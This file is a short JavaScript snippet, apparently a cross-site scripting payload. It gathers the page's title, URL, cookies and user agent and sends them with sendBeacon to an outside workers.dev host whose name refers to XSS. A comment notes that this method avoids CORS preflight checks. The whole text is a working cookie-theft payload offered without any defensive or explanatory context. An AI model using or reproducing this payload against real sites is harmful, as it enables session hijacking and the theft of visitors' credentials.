(function() {
    var workerUrl = "https://xss.agunggsec.workers.dev/";

    var data = JSON.stringify({
        title: document.title || "No Title",
        url: location.href,
        cookie: document.cookie || "None",
        ua: navigator.userAgent
    });

    // sendBeacon = bypass CORS preflight, no OPTIONS request
    var blob = new Blob([data], {type: "text/plain"});
    navigator.sendBeacon(workerUrl, blob);
})();
